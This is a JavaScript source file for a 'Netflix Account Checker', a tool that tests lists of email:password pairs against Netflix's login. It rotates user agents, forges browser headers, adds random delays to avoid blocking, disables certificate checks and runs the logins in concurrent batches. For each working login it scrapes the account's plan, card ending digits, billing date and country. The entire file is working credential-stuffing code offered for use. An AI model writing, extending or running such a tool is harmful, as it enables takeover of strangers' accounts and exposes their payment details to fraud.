// ============================================================
//  Netflix Account Checker — JS port of Netflix_cap.py
//  Made by TalkNeon
//  Exact 1:1 logic replication from Python version
// ============================================================

const https = require("https");
const http = require("http");

const MAX_RETRIES = 3;
const REQUEST_TIMEOUT = 30000;
const REQUEST_DELAY = [500, 2000];

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
];

function randomDelay() {
  const [min, max] = REQUEST_DELAY;
  return new Promise((r) => setTimeout(r, min + Math.random() * (max - min)));
}

function randomUA() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function getRealisticHeaders(ua) {
  return {
    "User-Agent": ua,
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    DNT: "1",
    Connection: "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Cache-Control": "max-age=0",
  };
}

// ── Cookie jar (simple) ──

class CookieJar {
  constructor() {
    this.cookies = {};
  }

  update(setCookieHeaders) {
    if (!setCookieHeaders) return;
    const arr = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
    for (const sc of arr) {
      const parts = sc.split(";")[0].split("=");
      const name = parts[0].trim();
      const value = parts.slice(1).join("=").trim();
      if (name) this.cookies[name] = value;
    }
  }

  toString() {
    return Object.entries(this.cookies)
      .map(([k, v]) => `${k}=${v}`)
      .join("; ");
  }

  has(name) {
    return name in this.cookies;
  }

  get(name) {
    return this.cookies[name];
  }

  getAll() {
    return { ...this.cookies };
  }

  clear() {
    this.cookies = {};
  }

  set(name, value) {
    this.cookies[name] = value;
  }
}

// ── HTTP helper with redirect + cookie support ──

function sessionFetch(url, options = {}, jar = null, redirectCount = 0) {
  return new Promise((resolve, reject) => {
    if (redirectCount > 10) return reject(new Error("Too many redirects"));

    const parsed = new URL(url);
    const mod = parsed.protocol === "https:" ? https : http;
    const headers = { ...(options.headers || {}) };

    if (jar) {
      const cs = jar.toString();
      if (cs) headers["Cookie"] = cs;
    }

    const reqOptions = {
      hostname: parsed.hostname,
      path: parsed.pathname + parsed.search,
      method: options.method || "GET",
      headers,
      timeout: REQUEST_TIMEOUT,
      rejectUnauthorized: false,
    };

    const req = mod.request(reqOptions, (res) => {
      if (jar) jar.update(res.headers["set-cookie"]);

      // Follow redirects
      if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
        const redirectUrl = res.headers.location.startsWith("http")
          ? res.headers.location
          : `${parsed.protocol}//${parsed.host}${res.headers.location}`;
        res.resume();
        return sessionFetch(redirectUrl, { ...options, method: "GET", body: undefined }, jar, redirectCount + 1)
          .then(resolve)
          .catch(reject);
      }

      const chunks = [];
      res.on("data", (c) => chunks.push(c));
      res.on("end", () => {
        const body = Buffer.concat(chunks).toString("utf-8");
        resolve({ statusCode: res.statusCode, headers: res.headers, body, url: res.url || url, finalUrl: url });
      });
    });

    req.on("error", reject);
    req.on("timeout", () => { req.destroy(); reject(new Error("Timeout")); });

    if (options.body) req.write(options.body);
    req.end();
  });
}

// ── Extract helpers (same as Python) ──

function extractEmail(html) {
  // Method 1: reactContext
  let m = html.match(/"email"\s*:\s*"([^"]+@[^"]+)"/);
  if (m && m[1].includes("@") && m[1].includes(".")) return m[1];

  // Method 2: userInfo
  m = html.match(/"userInfo"[^}]*"email"\s*:\s*"([^"]+)"/);
  if (m) return m[1];

  return "Unknown";
}

function extractPlan(html) {
  // JSON planName
  let m = html.match(/"planName"\s*:\s*"([^"]+)"/i);
  if (m) {
    const plan = m[1].toLowerCase();
    if (plan.includes("premium") || plan.includes("ultra")) {
      return plan.includes("4k") || plan.includes("uhd") ? "Premium (4K)" : "Premium";
    }
    if (plan.includes("standard")) return "Standard";
    if (plan.includes("basic")) return "Basic";
  }

  // Fallback: membership section
  const lower = html.toLowerCase();
  const idx = lower.indexOf("membership");
  if (idx !== -1) {
    const section = lower.substring(idx, idx + 1000);
    if (section.includes("premium") || section.includes("4k")) {
      return section.includes("4k") ? "Premium (4K)" : "Premium";
    }
    if (section.includes("standard")) return "Standard";
    if (section.includes("basic")) return "Basic";
  }

  return "Unknown";
}

function extractStatus(html) {
  const lower = html.toLowerCase();
  if (lower.includes("cancel membership") || lower.includes("restart membership")) {
    if (lower.includes("membership will end") || lower.includes("ends on")) return "Cancelled";
    if (lower.includes("cancel membership") && !lower.includes("membership will end")) return "Active";
  }
  if (lower.includes("free trial") || lower.includes("trial period")) return "Free Trial";
  if (lower.includes("your account") || lower.includes("membership")) return "Active";
  return "Unknown";
}

function extractPayment(html) {
  const lower = html.toLowerCase();
  const idx = lower.indexOf("payment");
  if (idx === -1) return "Unknown";
  const section = lower.substring(idx, idx + 500);
  const m = section.match(/ending\s+in\s+(\d{4})/);
  if (m) return `Card ****${m[1]}`;
  if (section.includes("credit card") || section.includes("debit")) return "Credit Card";
  if (section.includes("paypal")) return "PayPal";
  if (section.includes("gift")) return "Gift Card";
  return "Unknown";
}

function extractNextBilling(html) {
  let m = html.match(/(?:next billing|billing date)[^<]*?([A-Z][a-z]+\s+\d{1,2},\s+\d{4})/i);
  if (m) return m[1];
  m = html.match(/\b(\d{1,2}\/\d{1,2}\/\d{4})\b/);
  if (m) return m[1];
  return "Unknown";
}

function extractProfiles(html) {
  const matches = html.match(/"profileName"\s*:\s*"[^"]+"/g);
  if (matches && matches.length > 0) return String(matches.length);
  return "Unknown";
}

function extractCountry(html) {
  let m = html.match(/"country"\s*:\s*"([A-Z]{2})"/);
  if (m) return m[1];
  m = html.match(/"countryCode"\s*:\s*"([A-Z]{2})"/);
  if (m) return m[1];
  return "Unknown";
}

function extractCreated(html) {
  const m = html.match(/member\s+since[^\d]*(\d{4})/i);
  if (m) return m[1];
  return "Unknown";
}

// ── Netflix login (email:password) ──

async function loginWithEmailPassword(email, password) {
  const jar = new CookieJar();
  const ua = randomUA();
  const baseHeaders = getRealisticHeaders(ua);

  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
    try {
      // Step 1: Get login page
      const loginPage = await sessionFetch("https://www.netflix.com/login", { headers: baseHeaders }, jar);

      if (loginPage.statusCode === 429) return { success: false, errorType: "blocked" };
      if (loginPage.statusCode !== 200) continue;

      // Extract authURL
      let authUrl = "https://www.netflix.com/login";
      const authMatch = loginPage.body.match(/"authURL":"([^"]+)"/);
      if (authMatch) {
        authUrl = authMatch[1].replace(/\\\//g, "/");
      }

      await randomDelay();

      // Step 2: Submit login
      const loginData = [
        `userLoginId=${encodeURIComponent(email)}`,
        `password=${encodeURIComponent(password)}`,
        "rememberMe=true",
        "flow=websiteSignUp",
        "mode=login",
        "action=loginAction",
        "withFields=rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode",
      ].join("&");

      const loginHeaders = {
        ...baseHeaders,
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://www.netflix.com",
        Referer: "https://www.netflix.com/login",
        "Content-Length": Buffer.byteLength(loginData),
      };

      const loginResp = await sessionFetch(authUrl, { method: "POST", headers: loginHeaders, body: loginData }, jar);

      // Check success indicators (same logic as Python)
      let successIndicators = 0;

      // 1. Cookies
      if (jar.has("NetflixId") && jar.has("SecureNetflixId")) successIndicators++;

      // 2. URL check
      const respUrl = (loginResp.finalUrl || "").toLowerCase();
      if (["browse", "youraccount", "profiles"].some((x) => respUrl.includes(x))) successIndicators++;

      // 3. HTML content
      const htmlLower = loginResp.body.toLowerCase();
      if (["profilesgate", "browse", "billboardrow"].some((x) => htmlLower.includes(x))) successIndicators++;

      // 4. Error indicators
      const errorIndicators = ["incorrect password", "invalid email", "we could not find", "try again", "account not found"];
      if (errorIndicators.some((x) => htmlLower.includes(x))) {
        return { success: false, errorType: "invalid" };
      }

      if (successIndicators >= 1) {
        return { success: true, cookies: jar.getAll(), jar };
      }

      if (attempt < MAX_RETRIES - 1) continue;
      return { success: false, errorType: "invalid" };
    } catch (err) {
      if (err.message === "Timeout") {
        if (attempt < MAX_RETRIES - 1) { await randomDelay(); continue; }
        return { success: false, errorType: "timeout" };
      }
      if (attempt < MAX_RETRIES - 1) continue;
      return { success: false, errorType: "error" };
    }
  }
  return { success: false, errorType: "error" };
}

// ── Get account info from cookies ──

async function getAccountInfo(cookies, existingJar = null) {
  const jar = existingJar || new CookieJar();
  if (!existingJar) {
    for (const [name, value] of Object.entries(cookies)) {
      jar.set(name, value);
    }
  }
  const ua = randomUA();
  const baseHeaders = getRealisticHeaders(ua);

  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
    try {
      await randomDelay();

      const resp = await sessionFetch("https://www.netflix.com/YourAccount", { headers: baseHeaders }, jar);

      if (resp.statusCode === 429) return { info: null, errorType: "blocked" };
      if (resp.statusCode !== 200) {
        if (attempt < MAX_RETRIES - 1) continue;
        return { info: null, errorType: "error" };
      }

      // Check if redirected to login
      if (resp.finalUrl && resp.finalUrl.toLowerCase().includes("login")) {
        return { info: null, errorType: "invalid" };
      }

      const html = resp.body;

      return {
        info: {
          email: extractEmail(html),
          plan: extractPlan(html),
          status: extractStatus(html),
          payment: extractPayment(html),
          nextBilling: extractNextBilling(html),
          profiles: extractProfiles(html),
          country: extractCountry(html),
          created: extractCreated(html),
        },
        errorType: null,
      };
    } catch (err) {
      if (err.message === "Timeout") {
        if (attempt < MAX_RETRIES - 1) { await randomDelay(); continue; }
        return { info: null, errorType: "timeout" };
      }
      if (attempt < MAX_RETRIES - 1) continue;
      return { info: null, errorType: "error" };
    }
  }
  return { info: null, errorType: "error" };
}

// ── Check single combo ──

async function checkNetflixAccount(combo) {
  const idx = combo.indexOf(":");
  if (idx === -1) return { status: "error", combo, detail: "Invalid format" };

  const email = combo.substring(0, idx);
  const password = combo.substring(idx + 1);

  const loginResult = await loginWithEmailPassword(email, password);

  if (!loginResult.success) {
    return { status: loginResult.errorType || "invalid", combo, email, detail: loginResult.errorType };
  }

  const acctResult = await getAccountInfo(loginResult.cookies, loginResult.jar);

  if (!acctResult.info) {
    return { status: acctResult.errorType || "error", combo, email, detail: acctResult.errorType };
  }

  const info = acctResult.info;
  if (info.email === "Unknown") info.email = email;

  return {
    status: "hit",
    combo,
    email,
    password,
    plan: info.plan,
    accountStatus: info.status,
    payment: info.payment,
    nextBilling: info.nextBilling,
    profiles: info.profiles,
    country: info.country,
    created: info.created,
  };
}

// ── Batch checker ──

async function checkNetflixAccounts(combos, threads = 10, onProgress = null, stopSignal = null) {
  const results = [];
  let checked = 0;
  const total = combos.length;

  // Process in batches of `threads`
  for (let i = 0; i < combos.length; i += threads) {
    if (stopSignal && stopSignal.aborted) break;

    const batch = combos.slice(i, i + threads);
    const batchResults = await Promise.all(
      batch.map(async (combo) => {
        if (stopSignal && stopSignal.aborted) return { status: "skipped", combo };
        try {
          return await checkNetflixAccount(combo);
        } catch (err) {
          return { status: "error", combo, detail: err.message };
        }
      })
    );

    for (const r of batchResults) {
      results.push(r);
      checked++;
      if (onProgress) {
        try { onProgress(checked, total, r); } catch {}
      }
    }
  }

  return results;
}

module.exports = { checkNetflixAccount, checkNetflixAccounts };
